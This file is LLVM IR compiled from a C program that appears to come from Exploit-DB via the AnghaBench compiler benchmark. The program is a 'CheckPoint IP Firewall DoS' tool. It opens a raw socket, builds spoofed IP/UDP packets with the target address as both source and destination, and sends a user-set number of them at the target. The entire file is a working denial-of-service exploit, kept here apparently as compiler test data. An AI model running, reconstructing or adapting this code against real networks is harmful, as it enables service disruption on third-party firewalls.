; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/hardware/dos/extr_20050.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/hardware/dos/extr_20050.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.TYPE_10__ = type { i32, i32, i32, i32, i32, %struct.TYPE_7__, %struct.TYPE_6__, i64, i32, i64, i64 }
%struct.TYPE_7__ = type { i64 }
%struct.TYPE_6__ = type { i64 }
%struct.TYPE_9__ = type { i32, i32, i8*, i8* }
%struct.sockaddr_in = type { %struct.TYPE_8__, i32, i8* }
%struct.TYPE_8__ = type { i64 }
%struct.sockaddr = type { i32 }

@PSIZE = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [2 x i8] c"1\00", align 1
@stderr = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [33 x i8] c"\0A*** CheckPoint IP Firewall DoS\0A\00", align 1
@.str.2 = private unnamed_addr constant [57 x i8] c"*** Bug discovered by: antipent <rtodd@antipentium.com>\0A\00", align 1
@.str.3 = private unnamed_addr constant [45 x i8] c"*** Code by: lore <fiddler@antisocial.com>\0A\0A\00", align 1
@ERR = common dso_local global i64 0, align 8
@.str.4 = private unnamed_addr constant [21 x i8] c"Bad IP address '%s'\0A\00", align 1
@EXIT_FAILURE = common dso_local global i32 0, align 4
@.str.5 = private unnamed_addr constant [35 x i8] c"You should send at least 1 packet\0A\00", align 1
@AF_INET = common dso_local global i32 0, align 4
@SOCK_RAW = common dso_local global i32 0, align 4
@IPPROTO_RAW = common dso_local global i32 0, align 4
@.str.6 = private unnamed_addr constant [32 x i8] c"Couldn't create raw socket: %s\0A\00", align 1
@errno = common dso_local global i32 0, align 4
@IPPROTO_IP = common dso_local global i32 0, align 4
@IP_HDRINCL = common dso_local global i32 0, align 4
@.str.7 = private unnamed_addr constant [33 x i8] c"Couldn't set socket options: %s\0A\00", align 1
@.str.8 = private unnamed_addr constant [18 x i8] c"Sending packets: \00", align 1
@IP_OFF = common dso_local global i32 0, align 4
@UDP_OFF = common dso_local global i32 0, align 4
@IPPROTO_UDP = common dso_local global i32 0, align 4
@UDP_SIZE = common dso_local global i32 0, align 4
@.str.9 = private unnamed_addr constant [26 x i8] c"Couldn't send packet: %s\0A\00", align 1
@.str.10 = private unnamed_addr constant [2 x i8] c".\00", align 1
@.str.11 = private unnamed_addr constant [2 x i8] c"\0A\00", align 1
@EXIT_SUCCESS = common dso_local global i32 0, align 4

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i64, align 8
  %7 = alloca i64, align 8
  %8 = alloca %struct.TYPE_10__*, align 8
  %9 = alloca %struct.TYPE_9__*, align 8
  %10 = alloca i8*, align 8
  %11 = alloca i64, align 8
  %12 = alloca i8*, align 8
  %13 = alloca %struct.sockaddr_in, align 8
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %16 = load i32, i32* @PSIZE, align 4
  %17 = zext i32 %16 to i64
  %18 = call i8* @llvm.stacksave()
  store i8* %18, i8** %10, align 8
  %19 = alloca i8, i64 %17, align 16
  store i64 %17, i64* %11, align 8
  store i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str, i64 0, i64 0), i8** %12, align 8
  %20 = load i32, i32* %4, align 4
  %21 = icmp slt i32 %20, 3
  br i1 %21, label %22, label %27

22:                                               ; preds = %2
  %23 = load i8**, i8*** %5, align 8
  %24 = getelementptr inbounds i8*, i8** %23, i64 0
  %25 = load i8*, i8** %24, align 8
  %26 = call i32 @usage(i8* %25)
  br label %27

27:                                               ; preds = %22, %2
  %28 = load i32, i32* @stderr, align 4
  %29 = call i32 (i32, i8*, ...) @fprintf(i32 %28, i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.1, i64 0, i64 0))
  %30 = load i32, i32* @stderr, align 4
  %31 = call i32 (i32, i8*, ...) @fprintf(i32 %30, i8* getelementptr inbounds ([57 x i8], [57 x i8]* @.str.2, i64 0, i64 0))
  %32 = load i32, i32* @stderr, align 4
  %33 = call i32 (i32, i8*, ...) @fprintf(i32 %32, i8* getelementptr inbounds ([45 x i8], [45 x i8]* @.str.3, i64 0, i64 0))
  %34 = load i8**, i8*** %5, align 8
  %35 = getelementptr inbounds i8*, i8** %34, i64 1
  %36 = load i8*, i8** %35, align 8
  %37 = call i64 @inet_addr(i8* %36)
  store i64 %37, i64* %6, align 8
  %38 = load i64, i64* @ERR, align 8
  %39 = icmp eq i64 %37, %38
  br i1 %39, label %40, label %48

40:                                               ; preds = %27
  %41 = load i32, i32* @stderr, align 4
  %42 = load i8**, i8*** %5, align 8
  %43 = getelementptr inbounds i8*, i8** %42, i64 1
  %44 = load i8*, i8** %43, align 8
  %45 = call i32 (i32, i8*, ...) @fprintf(i32 %41, i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.4, i64 0, i64 0), i8* %44)
  %46 = load i32, i32* @EXIT_FAILURE, align 4
  %47 = call i32 @exit(i32 %46) #4
  unreachable

48:                                               ; preds = %27
  %49 = load i8**, i8*** %5, align 8
  %50 = getelementptr inbounds i8*, i8** %49, i64 2
  %51 = load i8*, i8** %50, align 8
  %52 = call i32 @atoi(i8* %51)
  store i32 %52, i32* %15, align 4
  %53 = icmp ne i32 %52, 0
  br i1 %53, label %59, label %54

54:                                               ; preds = %48
  %55 = load i32, i32* @stderr, align 4
  %56 = call i32 (i32, i8*, ...) @fprintf(i32 %55, i8* getelementptr inbounds ([35 x i8], [35 x i8]* @.str.5, i64 0, i64 0))
  %57 = load i32, i32* @EXIT_FAILURE, align 4
  %58 = call i32 @exit(i32 %57) #4
  unreachable

59:                                               ; preds = %48
  %60 = load i32, i32* @AF_INET, align 4
  %61 = load i32, i32* @SOCK_RAW, align 4
  %62 = load i32, i32* @IPPROTO_RAW, align 4
  %63 = call i64 @socket(i32 %60, i32 %61, i32 %62)
  store i64 %63, i64* %7, align 8
  %64 = load i64, i64* @ERR, align 8
  %65 = icmp eq i64 %63, %64
  br i1 %65, label %66, label %73

66:                                               ; preds = %59
  %67 = load i32, i32* @stderr, align 4
  %68 = load i32, i32* @errno, align 4
  %69 = call i8* @strerror(i32 %68)
  %70 = call i32 (i32, i8*, ...) @fprintf(i32 %67, i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.6, i64 0, i64 0), i8* %69)
  %71 = load i32, i32* @EXIT_FAILURE, align 4
  %72 = call i32 @exit(i32 %71) #4
  unreachable

73:                                               ; preds = %59
  %74 = load i64, i64* %7, align 8
  %75 = load i32, i32* @IPPROTO_IP, align 4
  %76 = load i32, i32* @IP_HDRINCL, align 4
  %77 = call i64 @setsockopt(i64 %74, i32 %75, i32 %76, i8** %12, i32 1)
  %78 = load i64, i64* @ERR, align 8
  %79 = icmp eq i64 %77, %78
  br i1 %79, label %80, label %87

80:                                               ; preds = %73
  %81 = load i32, i32* @stderr, align 4
  %82 = load i32, i32* @errno, align 4
  %83 = call i8* @strerror(i32 %82)
  %84 = call i32 (i32, i8*, ...) @fprintf(i32 %81, i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.7, i64 0, i64 0), i8* %83)
  %85 = load i32, i32* @EXIT_FAILURE, align 4
  %86 = call i32 @exit(i32 %85) #4
  unreachable

87:                                               ; preds = %73
  br label %88

88:                                               ; preds = %87
  br label %89

89:                                               ; preds = %88
  br label %90

90:                                               ; preds = %89
  %91 = call i64 @time(i32* null)
  %92 = trunc i64 %91 to i32
  %93 = call i32 @srand(i32 %92)
  %94 = load i32, i32* %4, align 4
  %95 = icmp sgt i32 %94, 3
  br i1 %95, label %96, label %103

96:                                               ; preds = %90
  %97 = load i8**, i8*** %5, align 8
  %98 = getelementptr inbounds i8*, i8** %97, i64 3
  %99 = load i8*, i8** %98, align 8
  %100 = call i32 @atoi(i8* %99)
  %101 = call i8* @htons(i32 %100)
  %102 = ptrtoint i8* %101 to i32
  store i32 %102, i32* %14, align 4
  br label %109

103:                                              ; preds = %90
  %104 = call i32 (...) @rand()
  %105 = srem i32 %104, 65535
  %106 = add nsw i32 %105, 1
  %107 = call i8* @htons(i32 %106)
  %108 = ptrtoint i8* %107 to i32
  store i32 %108, i32* %14, align 4
  br label %109

109:                                              ; preds = %103, %96
  %110 = load i32, i32* @stderr, align 4
  %111 = call i32 (i32, i8*, ...) @fprintf(i32 %110, i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.8, i64 0, i64 0))
  br label %112

112:                                              ; preds = %197, %109
  %113 = load i32, i32* %15, align 4
  %114 = add nsw i32 %113, -1
  store i32 %114, i32* %15, align 4
  %115 = icmp ne i32 %113, 0
  br i1 %115, label %116, label %200

116:                                              ; preds = %112
  %117 = load i32, i32* @PSIZE, align 4
  %118 = call i32 @memset(i8* %19, i32 0, i32 %117)
  %119 = load i32, i32* @IP_OFF, align 4
  %120 = sext i32 %119 to i64
  %121 = getelementptr inbounds i8, i8* %19, i64 %120
  %122 = bitcast i8* %121 to %struct.TYPE_10__*
  store %struct.TYPE_10__* %122, %struct.TYPE_10__** %8, align 8
  %123 = load i32, i32* @UDP_OFF, align 4
  %124 = sext i32 %123 to i64
  %125 = getelementptr inbounds i8, i8* %19, i64 %124
  %126 = bitcast i8* %125 to %struct.TYPE_9__*
  store %struct.TYPE_9__* %126, %struct.TYPE_9__** %9, align 8
  %127 = load %struct.TYPE_10__*, %struct.TYPE_10__** %8, align 8
  %128 = getelementptr inbounds %struct.TYPE_10__, %struct.TYPE_10__* %127, i32 0, i32 0
  store i32 5, i32* %128, align 8
  %129 = load %struct.TYPE_10__*, %struct.TYPE_10__** %8, align 8
  %130 = getelementptr inbounds %struct.TYPE_10__, %struct.TYPE_10__* %129, i32 0, i32 1
  store i32 4, i32* %130, align 4
  %131 = load %struct.TYPE_10__*, %struct.TYPE_10__** %8, align 8
  %132 = getelementptr inbounds %struct.TYPE_10__, %struct.TYPE_10__* %131, i32 0, i32 10
  store i64 0, i64* %132, align 8
  %133 = load i32, i32* @PSIZE, align 4
  %134 = load %struct.TYPE_10__*, %struct.TYPE_10__** %8, align 8
  %135 = getelementptr inbounds %struct.TYPE_10__, %struct.TYPE_10__* %134, i32 0, i32 2
  store i32 %133, i32* %135, align 8
  %136 = load %struct.TYPE_10__*, %struct.TYPE_10__** %8, align 8
  %137 = getelementptr inbounds %struct.TYPE_10__, %struct.TYPE_10__* %136, i32 0, i32 3
  store i32 1234, i32* %137, align 4
  %138 = load %struct.TYPE_10__*, %struct.TYPE_10__** %8, align 8
  %139 = getelementptr inbounds %struct.TYPE_10__, %struct.TYPE_10__* %138, i32 0, i32 9
  store i64 0, i64* %139, align 8
  %140 = load %struct.TYPE_10__*, %struct.TYPE_10__** %8, align 8
  %141 = getelementptr inbounds %struct.TYPE_10__, %struct.TYPE_10__* %140, i32 0, i32 4
  store i32 255, i32* %141, align 8
  %142 = load i32, i32* @IPPROTO_UDP, align 4
  %143 = load %struct.TYPE_10__*, %struct.TYPE_10__** %8, align 8
  %144 = getelementptr inbounds %struct.TYPE_10__, %struct.TYPE_10__* %143, i32 0, i32 8
  store i32 %142, i32* %144, align 8
  %145 = load %struct.TYPE_10__*, %struct.TYPE_10__** %8, align 8
  %146 = getelementptr inbounds %struct.TYPE_10__, %struct.TYPE_10__* %145, i32 0, i32 7
  store i64 0, i64* %146, align 8
  %147 = load i64, i64* %6, align 8
  %148 = load %struct.TYPE_10__*, %struct.TYPE_10__** %8, align 8
  %149 = getelementptr inbounds %struct.TYPE_10__, %struct.TYPE_10__* %148, i32 0, i32 6
  %150 = getelementptr inbounds %struct.TYPE_6__, %struct.TYPE_6__* %149, i32 0, i32 0
  store i64 %147, i64* %150, align 8
  %151 = load i64, i64* %6, align 8
  %152 = load %struct.TYPE_10__*, %struct.TYPE_10__** %8, align 8
  %153 = getelementptr inbounds %struct.TYPE_10__, %struct.TYPE_10__* %152, i32 0, i32 5
  %154 = getelementptr inbounds %struct.TYPE_7__, %struct.TYPE_7__* %153, i32 0, i32 0
  store i64 %151, i64* %154, align 8
  %155 = call i32 (...) @rand()
  %156 = srem i32 %155, 65535
  %157 = add nsw i32 %156, 1
  %158 = call i8* @htons(i32 %157)
  %159 = load %struct.TYPE_9__*, %struct.TYPE_9__** %9, align 8
  %160 = getelementptr inbounds %struct.TYPE_9__, %struct.TYPE_9__* %159, i32 0, i32 3
  store i8* %158, i8** %160, align 8
  %161 = load i32, i32* %14, align 4
  %162 = load %struct.TYPE_9__*, %struct.TYPE_9__** %9, align 8
  %163 = getelementptr inbounds %struct.TYPE_9__, %struct.TYPE_9__* %162, i32 0, i32 0
  store i32 %161, i32* %163, align 8
  %164 = load i32, i32* @UDP_SIZE, align 4
  %165 = call i8* @htons(i32 %164)
  %166 = load %struct.TYPE_9__*, %struct.TYPE_9__** %9, align 8
  %167 = getelementptr inbounds %struct.TYPE_9__, %struct.TYPE_9__* %166, i32 0, i32 2
  store i8* %165, i8** %167, align 8
  %168 = load %struct.TYPE_10__*, %struct.TYPE_10__** %8, align 8
  %169 = bitcast %struct.TYPE_10__* %168 to i32*
  %170 = load i32, i32* @PSIZE, align 4
  %171 = call i32 @checksum(i32* %169, i32 %170)
  %172 = load %struct.TYPE_9__*, %struct.TYPE_9__** %9, align 8
  %173 = getelementptr inbounds %struct.TYPE_9__, %struct.TYPE_9__* %172, i32 0, i32 1
  store i32 %171, i32* %173, align 4
  %174 = load i32, i32* %14, align 4
  %175 = call i8* @htons(i32 %174)
  %176 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 2
  store i8* %175, i8** %176, align 8
  %177 = load i32, i32* @AF_INET, align 4
  %178 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 1
  store i32 %177, i32* %178, align 8
  %179 = load i64, i64* %6, align 8
  %180 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 0
  %181 = getelementptr inbounds %struct.TYPE_8__, %struct.TYPE_8__* %180, i32 0, i32 0
  store i64 %179, i64* %181, align 8
  %182 = load i64, i64* %7, align 8
  %183 = load i32, i32* @PSIZE, align 4
  %184 = bitcast %struct.sockaddr_in* %13 to %struct.sockaddr*
  %185 = call i64 @sendto(i64 %182, i8* %19, i32 %183, i32 0, %struct.sockaddr* %184, i32 24)
  %186 = load i64, i64* @ERR, align 8
  %187 = icmp eq i64 %185, %186
  br i1 %187, label %188, label %197

188:                                              ; preds = %116
  %189 = load i32, i32* @stderr, align 4
  %190 = load i32, i32* @errno, align 4
  %191 = call i8* @strerror(i32 %190)
  %192 = call i32 (i32, i8*, ...) @fprintf(i32 %189, i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str.9, i64 0, i64 0), i8* %191)
  %193 = load i64, i64* %7, align 8
  %194 = call i32 @close(i64 %193)
  %195 = load i32, i32* @EXIT_FAILURE, align 4
  %196 = call i32 @exit(i32 %195) #4
  unreachable

197:                                              ; preds = %116
  %198 = load i32, i32* @stderr, align 4
  %199 = call i32 (i32, i8*, ...) @fprintf(i32 %198, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.10, i64 0, i64 0))
  br label %112

200:                                              ; preds = %112
  %201 = load i32, i32* @stderr, align 4
  %202 = call i32 (i32, i8*, ...) @fprintf(i32 %201, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.11, i64 0, i64 0))
  %203 = load i64, i64* %7, align 8
  %204 = call i32 @close(i64 %203)
  %205 = load i32, i32* @EXIT_SUCCESS, align 4
  store i32 %205, i32* %3, align 4
  %206 = load i8*, i8** %10, align 8
  call void @llvm.stackrestore(i8* %206)
  %207 = load i32, i32* %3, align 4
  ret i32 %207
}

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #1

declare dso_local i32 @usage(i8*) #2

declare dso_local i32 @fprintf(i32, i8*, ...) #2

declare dso_local i64 @inet_addr(i8*) #2

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #3

declare dso_local i32 @atoi(i8*) #2

declare dso_local i64 @socket(i32, i32, i32) #2

declare dso_local i8* @strerror(i32) #2

declare dso_local i64 @setsockopt(i64, i32, i32, i8**, i32) #2

declare dso_local i32 @srand(i32) #2

declare dso_local i64 @time(i32*) #2

declare dso_local i8* @htons(i32) #2

declare dso_local i32 @rand(...) #2

declare dso_local i32 @memset(i8*, i32, i32) #2

declare dso_local i32 @checksum(i32*, i32) #2

declare dso_local i64 @sendto(i64, i8*, i32, i32, %struct.sockaddr*, i32) #2

declare dso_local i32 @close(i64) #2

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
